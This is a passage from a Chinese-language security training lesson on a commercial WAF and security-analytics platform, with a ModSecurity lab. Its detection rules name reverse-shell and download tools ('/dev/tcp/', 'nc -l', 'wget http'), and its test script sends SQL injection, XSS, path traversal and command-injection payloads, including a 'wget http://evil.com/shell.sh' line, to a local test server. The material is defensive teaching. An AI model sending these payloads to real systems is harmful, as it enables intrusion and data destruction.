│ · 数据行为：下载量、外发量、打印量                       │
│ · 时间模式：工作时间 vs 非工作时间                      │
│ · 地理模式：常用地点 vs 异常地点                        │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                      实体维度                            │
├─────────────────────────────────────────────────────────┤
│ · 服务器：CPU/内存/磁盘使用模式                          │
│ · 数据库：查询频率、查询类型、数据量                     │
│ · 网络设备：流量模式、连接模式                           │
│ · 应用：API调用模式、错误率                              │
│ · 文件：访问频率、修改频率、移动/删除                    │
└─────────────────────────────────────────────────────────┘
```

### 14.3 UEBA典型检测场景

| 场景 | 正常行为基线 | 异常行为 | 检测方式 |
|------|-------------|----------|----------|
| **账号被盗** | 员工A每天9:00-18:00从北京登录 | 凌晨3:00从俄罗斯登录 | 时间+地点异常 |
| **数据泄露** | 员工B每天下载约10个文件 | 某天突然下载了500个文件 | 数量异常 |
| **内部威胁** | 员工C只访问自己部门的文件 | 开始访问财务/HR部门的文件 | 权限范围异常 |
| **横向移动** | 服务器A只与服务器B通信 | 服务器A开始连接全网服务器 | 连接模式异常 |
| **权限提升** | 普通用户D只有只读权限 | 尝试执行管理员操作 | 行为模式异常 |

### 14.4 UEBA的机器学习实现

```
UEBA的ML实现（简化的伪代码流程）：

Step 1: 构建用户画像
for each user:
    baseline = {
        login_hours: [9,10,11,12,13,14,15,16,17,18],
        login_locations: ["Beijing"],
        avg_daily_downloads: 10.5,
        typical_accessed_systems: ["OA", "CRM", "Email"],
        avg_session_duration: 480  # 分钟
    }

Step 2: 实时监控
for each user_action:
    deviation_score = 0
    
    if action.time not in baseline.login_hours:
        deviation_score += 20
    
    if action.location not in baseline.login_locations:
        deviation_score += 30
    
    if action.downloads_today > baseline.avg_daily_downloads * 3:
        deviation_score += 25
    
    if action.accessed_system not in baseline.typical_accessed_systems:
        deviation_score += 15
    
    if deviation_score > 50:
        generate_alert(user, deviation_score, action)

Step 3: 动态更新
for each user:
    # 使用指数移动平均(EMA)更新基线
    baseline = 0.9 * baseline + 0.1 * today_behavior
```

---

## 15. AiLPHA的威胁狩猎能力

### 15.1 什么是威胁狩猎？

**威胁狩猎（Threat Hunting）**不同于被动等待告警，而是**主动在环境中寻找已经潜伏的威胁**。

> 类比：被动告警 = 等小偷触发了警报再出警；威胁狩猎 = 警察主动巡逻，寻找可疑迹象。

### 15.2 AiLPHA的威胁狩猎方法

```
AiLPHA支持的威胁狩猎技术：

1. 基于假设的狩猎（Hypothesis-Driven）
   假设："攻击者可能使用PowerShell进行横向移动"
   查询：搜索所有PowerShell执行日志，找可疑的编码命令

2. 基于IOC的狩猎（IOC-Driven）
   获取威胁情报中的IP/域名/哈希
   在历史日志中搜索是否出现过这些IOC

3. 基于异常的狩猎（Anomaly-Driven）
   AI自动发现行为异常
   安全分析师验证异常是否为真实威胁

4. 基于TTP的狩猎（TTP-Driven）
   基于MITRE ATT&CK框架的技术/战术
   搜索与特定攻击技术匹配的行为模式
```

### 15.3 威胁狩猎实战示例

```
狩猎场景：寻找Cobalt Strike Beacon的活动

Cobalt Strike是红队/攻击者常用的C2工具，其Beacon（后门）
的HTTP通信有以下特征：

特征1：HTTP GET请求的URI是随机字符串，长度通常为4-8字符
特征2：Cookie中包含base64编码的数据
特征3：HTTP响应通常为空或包含编码的二进制数据
特征4：通信间隔有规律（如每60秒一次心跳）

在AiLPHA中构造狩猎查询：

# 搜索可疑的周期性HTTP通信
index=network_traffic
| where uri_length between(4,8)
| where uri matches "^/[a-zA-Z0-9]{4,8}$"
| where cookie_length > 50
| where response_body_length < 100
| stats count by source_ip, destination_ip, uri
| where count > 10
| sort -count
```

---

## 16. AiLPHA与明御WAF的联动

### 16.1 联动架构

AiLPHA和明御WAF不是孤立的，它们可以实现深度联动：

```
┌─────────────────────────────────────────────────────────────┐
│                  AiLPHA + 明御WAF 联动架构                    │
│                                                             │
│                        ┌──────────────┐                     │
│                        │   AiLPHA     │                     │
│                        │   分析大脑    │                     │
│                        └──────┬───────┘                     │
│                               │                             │
│           ┌───────────────────┼───────────────────┐         │
│           │                   │                   │         │
│     ┌─────▼─────┐      ┌──────▼──────┐     ┌─────▼─────┐  │
│     │ 明御WAF-1  │      │ 明御WAF-2   │     │ 明御WAF-3  │  │
│     │ (Web A)   │      │ (Web B)     │     │ (Web C)   │  │
│     └───────────┘      └─────────────┘     └───────────┘  │
│                                                             │
│  联动方式：                                                 │
│  1. WAF → AiLPHA：发送攻击日志和告警数据                    │
│  2. AiLPHA → WAF：下发封锁策略（IP/UA/Cookie等）           │
│  3. AiLPHA综合分析多台WAF的数据，发现分布式攻击             │
└─────────────────────────────────────────────────────────────┘
```

### 16.2 联动场景

| 场景 | AiLPHA发现 | 联动动作 |
|------|-----------|----------|
| 分布式扫描 | 同一攻击者从多个IP扫描多个站点 | 向所有WAF下发攻击者指纹封锁策略 |
| 撞库攻击 | 同一IP对多个账号尝试登录 | 向WAF下发IP+接口限流策略 |
| 0day利用 | AI检测到异常行为模式 | 向WAF下发临时虚拟补丁规则 |
| 数据泄露 | 检测到异常数据外传 | 向WAF下发敏感数据检测增强策略 |

---

## 17. 明御WAF vs 雷池WAF：ML引擎 vs 语义引擎

### 17.1 两种不同的技术路线

在WAF领域，有两种最前沿的技术路线：

```
路线A：ML学习引擎（明御WAF为代表）
核心思想："学习什么是正常的，偏离就是异常"
优势：能检测未知攻击
劣势：需要学习期，初始误报高

路线B：语义分析引擎（雷池WAF为代表）  
核心思想："理解SQL/代码的真正含义，而不仅仅是匹配字符串"
优势：精确，误报极低（<0.01%）
劣势：只能检测SQL注入、XSS等代码注入类攻击
```

### 17.2 技术原理对比

```
ML白名单建模（明御WAF）：
请求 → 特征提取 → ML模型打分 → 异常？→ 拦截
原理：统计学习，找"不像正常请求"的请求

SQL语义分析（雷池WAF）：
请求 → 词法分析 → 语法分析(AST) → 语义分析 → 判定
原理：编译原理，理解SQL语句的"真正含义"
```

### 17.3 详细对比

| 对比维度 | 明御WAF (ML引擎) | 雷池WAF (语义引擎) |
|----------|-----------------|-------------------|
| **核心技术** | 机器学习白名单建模 | SQL语义分析（词法→语法→语义） |
| **检测原理** | 偏离正常=异常 | 理解SQL语义=判定是否恶意 |
| **SQL注入检测** | ★★★★ 通过异常评分 | ★★★★★ 精确语义判断 |
| **XSS检测** | ★★★★ 通过异常评分 | ★★★★ 语义分析+规则 |
| **0day检测** | ★★★★★ 不依赖签名 | ★★★ 需要语法规则更新 |
| **误报率** | 初始较高(~5%)，学习后低(~1%) | 极低(<0.01%) |
| **漏报率** | 较低(ML可发现未知攻击) | 极低(语义理解难绕过) |
| **可绕过性** | 低(需模仿正常行为) | 极低(语法层面无法绕过) |
| **部署难度** | 需要学习期(1-4周) | 开箱即用 |
| **计算资源** | 需要GPU/高CPU | 仅需CPU |
| **适用场景** | 业务逻辑复杂、定制化高的Web应用 | 通用Web防护，尤其是SQL密集型应用 |
| **价格** | 商业产品，较贵 | 社区版免费 |

### 17.4 最佳实践建议

```
选择明御WAF(ML引擎)的情况：
✓ 业务逻辑复杂，定制化程度高
✓ 有足够的学习期和运维团队
✓ 需要检测0day攻击
✓ 预算充足

选择雷池WAF(语义引擎)的情况：
✓ 以SQL注入为主要威胁
✓ 需要开箱即用
✓ 对误报率要求极高
✓ 预算有限（社区版免费）

最佳方案：两者结合
明御WAF做外层防护（广覆盖）+ 雷池WAF做数据库前端（精防护）
```

---

## 18. 实操实验：使用ModSecurity+机器学习模拟ML-WAF

### 18.1 实验目标

由于明御WAF是商业产品，我们将使用**ModSecurity（开源WAF）+ 自定义规则**来模拟WAF的核心功能，并通过一个Python脚本模拟ML白名单学习的思路。

### 18.2 实验环境

```
实验环境：
├── 操作系统：Ubuntu 20.04
├── Docker & Docker Compose
├── Nginx + ModSecurity
└── Python 3.8+（用于ML模拟）
```

---

## 19. 实验一：部署ModSecurity WAF

### 步骤1：使用Docker部署Nginx+ModSecurity

```bash
# 创建工作目录
mkdir -p ~/waf-lab
cd ~/waf-lab

# 创建docker-compose.yml
cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  # ModSecurity WAF + Nginx
  waf:
    image: owasp/modsecurity-crs:nginx
    container_name: waf-nginx
    ports:
      - "80:80"
    environment:
      - PARANOIA=1
      - ANOMALY_INBOUND=5
      - ANOMALY_OUTBOUND=4
    volumes:
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf
      - ./modsecurity/custom-rules.conf:/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf
    networks:
      - waf-net

  # 后端Web应用（模拟）
  webapp:
    image: nginx:alpine
    container_name: webapp-backend
    volumes:
      - ./webapp:/usr/share/nginx/html
      - ./webapp/nginx.conf:/etc/nginx/conf.d/default.conf
    networks:
      - waf-net

networks:
  waf-net:
    driver: bridge
EOF
```

### 步骤2：配置Nginx反向代理

```bash
cat > ~/waf-lab/nginx/default.conf << 'EOF'
server {
    listen 80;
    server_name localhost;
    
    # 启用ModSecurity
    modsecurity on;
    modsecurity_rules_file /etc/modsecurity.d/owasp-crs/rules/custom-rules.conf;
    
    location / {
        proxy_pass http://webapp-backend:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # ModSecurity处理
        ModSecurityEnabled on;
        ModSecurityConfig modsecurity.conf;
    }
}
EOF
```

### 步骤3：创建模拟Web应用

```bash
mkdir -p ~/waf-lab/webapp

# 模拟Web页面
cat > ~/waf-lab/webapp/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>测试Web应用</title>
</head>
<body>
    <h1>欢迎来到测试Web应用</h1>
    <p>这是一个用于WAF测试的模拟应用。</p>
    
    <h2>功能列表：</h2>
    <ul>
        <li><a href="/search">搜索页面</a></li>
        <li><a href="/login">登录页面</a></li>
        <li><a href="/admin">管理页面</a></li>
        <li><a href="/api/users">API接口</a></li>
    </ul>
</body>
</html>
EOF

# 模拟搜索页面（有SQL注入漏洞的）
cat > ~/waf-lab/webapp/search.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>搜索</title></head>
<body>
    <h1>搜索页面</h1>
    <form action="/search" method="GET">
        <input type="text" name="q" placeholder="输入搜索关键词">
        <button type="submit">搜索</button>
    </form>
    <div id="results"></div>
</body>
</html>
EOF

# Nginx配置
cat > ~/waf-lab/webapp/nginx.conf << 'EOF'
server {
    listen 80;
    server_name localhost;
    root /usr/share/nginx/html;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location /search {
        return 200 '{"results": [], "query": "$arg_q"}';
        add_header Content-Type application/json;
    }
    
    location /api/users {
        return 200 '{"users": [{"id":1,"name":"admin"},{"id":2,"name":"user"}]}';
        add_header Content-Type application/json;
    }
}
EOF
```

### 步骤4：创建自定义ModSecurity规则

```bash
cat > ~/waf-lab/modsecurity/custom-rules.conf << 'EOF'
# 自定义WAF规则

# 启用规则引擎
SecRuleEngine On

# 基本SQL注入检测规则
SecRule ARGS "@rx (?i)(\bselect\b.*\bfrom\b|\bunion\b.*\bselect\b|\binsert\b.*\binto\b|\bdelete\b.*\bfrom\b|\bdrop\b.*\btable\b|\bexec\b.*\bxp_cmdshell\b|\b1\s*=\s*1|\b1\s*=\s*2|\bOR\s+['\"]?\d['\"]?\s*=\s*['\"]?\d)" \
    "id:100001,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection Attack Detected',\
    severity:'CRITICAL',\
    logdata:'Matched SQL injection pattern: %{MATCHED_VAR}'"

# XSS检测规则
SecRule ARGS "@rx (?i)(<script[^>]*>.*?</script>|javascript\s*:|onerror\s*=|onload\s*=|onclick\s*=|<img[^>]+onerror)" \
    "id:100002,\
    phase:2,\
    deny,\
    status:403,\
    msg:'XSS Attack Detected',\
    severity:'CRITICAL',\
    logdata:'Matched XSS pattern: %{MATCHED_VAR}'"

# 命令注入检测
SecRule ARGS "@rx (?i)(\bcat\s+/etc/passwd\b|\b/bin/bash\b|\bcmd\.exe\b|\bnc\s+-[lpe]\b|\bwget\s+http|\bcurl\s+http|\b/dev/tcp/)" \
    "id:100003,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Command Injection Detected',\
    severity:'CRITICAL',\
    logdata:'Matched command injection: %{MATCHED_VAR}'"

# 路径遍历检测
SecRule ARGS "@rx \.\.\/|\.\.\\\|%2e%2e%2f|%2e%2e/" \
    "id:100004,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Path Traversal Attack Detected',\
    severity:'CRITICAL'"

# 扫描器User-Agent检测
SecRule REQUEST_HEADERS:User-Agent "@rx (?i)(sqlmap|nikto|nmap|acunetix|burpsuite|nessus|openvas|gobuster|dirbuster)" \
    "id:100005,\
    phase:1,\
    deny,\
    status:403,\
    msg:'Security Scanner Detected',\
    severity:'WARNING'"

# 限制请求频率（模拟CC防护）
SecRule IP:REQUEST_RATE "@gt 100" \
    "id:100006,\
    phase:1,\
    deny,\
    status:429,\
    msg:'Rate Limit Exceeded',\
    severity:'WARNING'"

# 记录所有被拦截的请求
SecRule REQUEST_URI ".*" \
    "id:100007,\
    phase:5,\
    pass,\
    log,\
    msg:'Request logged for analysis'"
EOF
```

### 步骤5：启动环境

```bash
cd ~/waf-lab

# 启动服务
docker-compose up -d

# 检查服务状态
docker-compose ps

# 测试正常访问
curl -v http://localhost/
# 应该返回200，看到测试页面

# 测试WAF拦截SQL注入
curl -v "http://localhost/search?q=test'+OR+'1'='1"
# 应该返回403 Forbidden
```

---

## 20. 实验二：编写自定义WAF规则

### 步骤1：添加更精准的检测规则

```bash
cat >> ~/waf-lab/modsecurity/custom-rules.conf << 'EOF'

# 精确SQL注入检测（检测常见的SQL关键字组合）
SecRule ARGS "@rx (?i)(\bselect\b.{0,20}\bfrom\b|\bunion\b.{0,20}\bselect\b|\binsert\b.{0,20}\binto\b.{0,20}\bvalues\b)" \
    "id:100010,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection - Query Structure Detected',\
    severity:'CRITICAL'"

# 检测HTTP请求中的SQL注释符
SecRule ARGS "@rx (\-\-[\s]|\#[\s]|/\*.*\*/)" \
    "id:100011,\
    phase:2,\
    deny,\
    status:403,\
    msg:'SQL Injection - Comment Sequence Detected',\
    severity:'CRITICAL'"

# 检测异常的User-Agent
SecRule REQUEST_HEADERS:User-Agent "@rx ^$" \
    "id:100012,\
    phase:1,\
    deny,\
    status:403,\
    msg:'Empty User-Agent Detected',\
    severity:'NOTICE'"

# 检测文件上传攻击
SecRule FILES_TMPNAMES "@inspectFile /usr/bin/file" \
    "id:100013,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Malicious File Upload Detected',\
    severity:'CRITICAL'"
EOF
```

### 步骤2：重启WAF使规则生效

```bash
cd ~/waf-lab
docker-compose restart waf
```

---

## 21. 实验三：模拟ML白名单学习过程

这个实验用一个Python脚本来模拟ML白名单学习的核心思路：

```bash
cat > ~/waf-lab/ml_waf_simulator.py << 'PYEOF'
#!/usr/bin/env python3
"""
ML白名单WAF模拟器
模拟明御WAF的ML白名单建模引擎的核心思路
"""

import re
import math
import json
from collections import defaultdict
from statistics import mean, stdev

class MLWAFSimulator:
    """模拟ML-WAF的白名单学习与检测"""
    
    def __init__(self):
        self.baseline = {}  # 正常行为基线
        self.training_data = []
        self.anomaly_threshold = 2.5  # 异常阈值（标准差倍数）
    
    def extract_features(self, request):
        """从HTTP请求中提取特征（模拟ML引擎）"""
        features = {}
        
        # URL特征
        features['url_length'] = len(request.get('url', ''))
        features['url_depth'] = request.get('url', '').count('/')
        features['url_has_special_chars'] = len(re.findall(r'[<>\'";()]', request.get('url', '')))
        
        # 参数特征
        params = request.get('params', {})
        features['param_count'] = len(params)
        
        total_param_length = 0
        total_special_chars = 0
        for k, v in params.items():
            total_param_length += len(str(v))
            total_special_chars += len(re.findall(r'[<>\'";()\-\-]', str(v)))
        
        features['total_param_length'] = total_param_length
        features['param_special_chars'] = total_special_chars
        
        # 计算参数值的熵（随机性指标）
        if total_param_length > 0:
            features['param_entropy'] = self._calculate_entropy(str(params))
        else:
            features['param_entropy'] = 0
        
        # 请求方法
        features['method'] = request.get('method', 'GET')
        
        return features
    
    def _calculate_entropy(self, text):
        """计算字符串的Shannon熵"""
        if not text:
            return 0
        freq = defaultdict(int)
        for char in text:
            freq[char] += 1
        length = len(text)
        entropy = 0
        for count in freq.values():
            p = count / length
            entropy -= p * math.log2(p)
        return entropy
    
    def train(self, normal_requests):
        """学习期：从正常请求中学习基线"""
        print("=" * 60)
        print("第一阶段：学习期（Learning Phase）")
        print("=" * 60)
        
        all_features = defaultdict(list)
        
        for i, req in enumerate(normal_requests):
            features = self.extract_features(req)
            self.training_data.append(features)
            
            for key, value in features.items():
                if isinstance(value, (int, float)):
                    all_features[key].append(value)
            
            print(f"[学习] 请求 {i+1}: {req['url']} → 特征提取完成")
        
        # 计算每个特征的基线（均值和标准差）
        for key, values in all_features.items():
            self.baseline[key] = {
                'mean': mean(values),
                'std': stdev(values) if len(values) > 1 else 0.1,
                'min': min(values),
                'max': max(values)
            }
        
        print(f"\n学习完成！共学习了 {len(normal_requests)} 个正常请求")
        print(f"建立了 {len(self.baseline)} 个特征的基线\n")
        
        return self.baseline
    
    def detect(self, request):
        """检测期：评估请求的异常程度"""
        features = self.extract_features(request)
        
        anomaly_scores = {}
        total_score = 0
        anomaly_count = 0
        
        for key, value in features.items():
            if isinstance(value, (int, float)) and key in self.baseline:
                baseline = self.baseline[key]
                
                if baseline['std'] > 0:
                    # Z-score：偏离均值多少个标准差
                    z_score = abs(value - baseline['mean']) / baseline['std']
                    anomaly_scores[key] = z_score
                    
                    if z_score > self.anomaly_threshold:
                        total_score += min(z_score * 10, 100)
                        anomaly_count += 1
        
        # 综合异常评分
        if anomaly_count > 0:
            final_score = total_score / anomaly_count
        else:
            final_score = 0
        
        return {
            'request': request,
            'features': features,
            'anomaly_scores': anomaly_scores,
            'final_score': final_score,
            'verdict': 'BLOCK' if final_score >= 60 else ('ALERT' if final_score >= 40 else 'PASS')
        }
    
    def print_baseline(self):
        """打印学习到的基线"""
        print("\n" + "=" * 60)
        print("学习到的正常行为基线")
        print("=" * 60)
        for feature, stats in self.baseline.items():
            print(f"  {feature}: 均值={stats['mean']:.2f}, 标准差={stats['std']:.2f}, 范围=[{stats['min']}, {stats['max']}]")
        print()


def main():
    # 创建ML-WAF模拟器
    waf = MLWAFSimulator()
    
    # 模拟正常业务请求（学习期数据）
    normal_requests = [
        {"url": "/index.html", "method": "GET", "params": {}},
        {"url": "/search", "method": "GET", "params": {"q": "hello"}},
        {"url": "/search", "method": "GET", "params": {"q": "网络安全"}},
        {"url": "/products/123", "method": "GET", "params": {}},
        {"url": "/products/456", "method": "GET", "params": {}},
        {"url": "/login", "method": "POST", "params": {"username": "admin", "password": "***"}},
        {"url": "/login", "method": "POST", "params": {"username": "user1", "password": "***"}},
        {"url": "/api/users", "method": "GET", "params": {"page": "1", "limit": "10"}},
        {"url": "/api/users", "method": "GET", "params": {"page": "2", "limit": "10"}},
        {"url": "/about", "method": "GET", "params": {}},
        {"url": "/contact", "method": "GET", "params": {}},
        {"url": "/search", "method": "GET", "params": {"q": "安恒信息"}},
        {"url": "/products/789", "method": "GET", "params": {}},
        {"url": "/news/2024", "method": "GET", "params": {}},
        {"url": "/faq", "method": "GET", "params": {}},
    ]
    
    # 第一阶段：学习
    waf.train(normal_requests)
    waf.print_baseline()
    
    # 第二阶段：检测
    print("=" * 60)
    print("第二阶段：检测期（Detection Phase）")
    print("=" * 60)
    
    test_requests = [
        # 正常请求
        {"url": "/search", "method": "GET", "params": {"q": "测试搜索"}},
        # SQL注入攻击
        {"url": "/search", "method": "GET", "params": {"q": "' OR '1'='1' --"}},
        # XSS攻击
        {"url": "/search", "method": "GET", "params": {"q": "<script>alert(1)</script>"}},
        # 命令注入
        {"url": "/search", "method": "GET", "params": {"q": "; cat /etc/passwd"}},
        # 正常请求
        {"url": "/products/999", "method": "GET", "params": {}},
        # 路径遍历
        {"url": "/../../../etc/passwd", "method": "GET", "params": {}},
        # 极长参数（异常）
        {"url": "/search", "method": "GET", "params": {"q": "A" * 500}},
    ]
    
    for i, req in enumerate(test_requests):
        result = waf.detect(req)
        
        # 根据判定结果选择显示符号
        if result['verdict'] == 'BLOCK':
            icon = "🚫"
        elif result['verdict'] == 'ALERT':
            icon = "⚠️"
        else:
            icon = "✅"
        
        print(f"\n{icon} 测试 {i+1}: {req['url']}")
        print(f"   参数: {req['params']}")
        print(f"   异常评分: {result['final_score']:.1f}")
        print(f"   判定: {result['verdict']}")
        
        if result['anomaly_scores']:
            print(f"   异常特征:")
            for feat, score in sorted(result['anomaly_scores'].items(), key=lambda x: -x[1]):
                if score > 1.0:
                    print(f"     - {feat}: Z-score={score:.2f} (异常!)")


if __name__ == "__main__":
    main()
PYEOF

chmod +x ~/waf-lab/ml_waf_simulator.py
```

### 运行ML模拟器

```bash
cd ~/waf-lab
python3 ml_waf_simulator.py
```

你会看到ML引擎如何学习正常请求的特征基线，然后用这个基线来检测异常请求。注意观察SQL注入和XSS攻击是如何因为参数包含特殊字符和异常熵值而被检测出来的。

---

## 22. 实验四：测试攻击拦截效果

### 测试脚本

```bash
cat > ~/waf-lab/test_attacks.sh << 'SCRIPT'
#!/bin/bash

WAF_URL="http://localhost"
PASS=0
BLOCK=0

echo "========================================"
echo "  WAF攻击拦截测试"
echo "========================================"
echo ""

# 测试函数
test_attack() {
    local name="$1"
    local url="$2"
    local expected="$3"
    
    http_code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    
    if [ "$http_code" == "$expected" ]; then
        echo "✅ PASS: $name (返回 $http_code，符合预期)"
        ((PASS++))
    else
        echo "❌ FAIL: $name (返回 $http_code，预期 $expected)"
    fi
}

# 正常请求（应该通过）
test_attack "正常首页访问" "$WAF_URL/" "200"
test_attack "正常搜索" "$WAF_URL/search?q=hello" "200"

# SQL注入（应该拦截）
test_attack "SQL注入-基本" "$WAF_URL/search?q=test'+OR+'1'='1" "403"
test_attack "SQL注入-UNION" "$WAF_URL/search?q=test'+UNION+SELECT+*+FROM+users" "403"
test_attack "SQL注入-注释" "$WAF_URL/search?q=admin'--" "403"
test_attack "SQL注入-DROP" "$WAF_URL/search?q=1';+DROP+TABLE+users;--" "403"

# XSS（应该拦截）
test_attack "XSS-script标签" "$WAF_URL/search?q=<script>alert(1)</script>" "403"
test_attack "XSS-onerror" "$WAF_URL/search?q=<img+src=x+onerror=alert(1)>" "403"

# 命令注入（应该拦截）
test_attack "命令注入-cat" "$WAF_URL/search?q=;cat+/etc/passwd" "403"
test_attack "命令注入-wget" "$WAF_URL/search?q=;wget+http://evil.com/shell.sh" "403"

# 路径遍历（应该拦截）
test_attack "路径遍历" "$WAF_URL/../../../etc/passwd" "403"

echo ""
echo "========================================"
echo "  测试结果: $PASS 通过, $((10-PASS)) 失败"
echo "========================================"
SCRIPT

chmod +x ~/waf-lab/test_attacks.sh

# 运行测试
cd ~/waf-lab
./test_attacks.sh
```

---

## 23. 验收练习

### 基础题（必答）

**Q1：安恒信息的核心企业基因是什么？它如何影响产品布局？**

<details>
<summary>点击查看答案</summary>

安恒信息以**Web安全**起家（2007年成立，2008年发布明御WAF），核心基因是**对Web应用和HTTP协议的深度理解**。这影响了其产品布局：从WAF出发，自然延伸到数据库安全（Web应用的后端），再到AI分析（WAF本身就是大数据场景），形成了Web安全→数据安全→AI分析的产品演进路径。

</details>

**Q2：明御WAF的ML白名单建模与传统规则引擎有什么区别？**

<details>
<summary>点击查看答案</summary>

- **传统规则引擎**：黑名单思路，列出已知攻击特征，匹配到就拦截。优点是精确，缺点是无法检测未知攻击，容易绕过。
- **ML白名单建模**：白名单思路，学习正常业务行为模式，偏离正常即为异常。优点是可检测未知攻击，缺点是学习期初始误报高。

两者在明御WAF中结合使用：规则引擎做已知攻击精确拦截，ML引擎做未知异常智能发现。

</details>

**Q3：AiLPHA中的UEBA是什么？举例说明其应用场景。**

<details>
<summary>点击查看答案</summary>

UEBA（User and Entity Behavior Analytics，用户实体行为分析）是通过学习用户/实体的正常行为基线，发现偏离正常模式的异常行为。典型场景：
- 员工账号被盗：平时9:00-18:00从北京登录，突然凌晨3:00从俄罗斯登录
- 数据泄露：平时每天下载10个文件，某天突然下载500个
- 横向移动：服务器A平时只连B，突然开始连接全网服务器

</details>

### 进阶题（选答）

**Q4：对比明御WAF的ML引擎和雷池WAF的语义引擎，各自的优劣势是什么？**

<details>
<summary>点击查看答案</summary>

| 维度 | 明御ML引擎 | 雷池语义引擎 |
|------|-----------|-------------|
| 优势 | 可检测0day/未知攻击、持续学习优化 | 误报极低(<0.01%)、几乎不可绕过、开箱即用 |
| 劣势 | 需要学习期、初始误报高、资源消耗大 | 主要针对代码注入类攻击、需要语法规则更新 |

最佳实践：两者结合，明御做外层广覆盖，雷池做数据库前端精防护。

</details>

**Q5：AiLPHA如何实现告警降噪？描述其降噪流程。**

<details>
<summary>点击查看答案</summary>

告警降噪流程：
1. 去重：相同告警合并
2. 聚合：相关告警聚合为一个事件
3. 上下文富化：结合资产信息、漏洞信息评估
4. AI优先级排序：自动定级
5. 关联分析：关联为安全事件

最终效果：100,000条原始告警 → 20个安全事件（效率提升5000倍）

</details>

---

## 24. 今日总结

### 核心收获

今天，我们深入学习了安恒信息的两大核心产品：

**1. 明御WAF**
- 国内最早一批WAF产品，2008年发布
- 核心差异化：**ML白名单建模引擎**——学习正常行为，发现异常
- 三重引擎协同：规则引擎（已知攻击）+ ML引擎（未知异常）+ 语义引擎（行为分析）
- 支持三种部署模式：反向代理、透明桥、旁路镜像
- 高级功能：Bot管理、API安全、CC防护、虚拟补丁

**2. AiLPHA态势感知**
- AI驱动的安全分析大脑
- 核心模块：UEBA用户实体行为分析
- 关键能力：告警降噪（100,000→20）、威胁狩猎、攻击链还原
- 与明御WAF联动形成闭环

**3. 技术对比认知**
- ML白名单（明御）vs 语义分析（雷池）：两种不同的技术路线
- 各有优劣，最佳实践是结合使用

### 记忆口诀

```
安恒信息三件宝：WAF、数据、AI好
明御WAF是看家，ML学习是法宝
AiLPHA大脑强，行为分析抓内鬼
Web安全起家早，专而精是护城河
```

### 下一步

明天（Day 41），我们将继续学习安恒信息的数据安全产品线：明御DAS（数据库审计）、堡垒机（运维审计）和漏洞扫描，完善对安恒"专而精"产品布局的理解。

---

> **今日格言**：用规则拦截已知的恶意，用AI发现未知的威胁——好的WAF是规则和AI的结合。

> **扩展思考**：如果你是一家电商公司的安全工程师，面对每天数百万的Web请求，你会选择明御WAF的ML引擎还是雷池WAF的语义引擎？为什么？有没有可能两个都用？
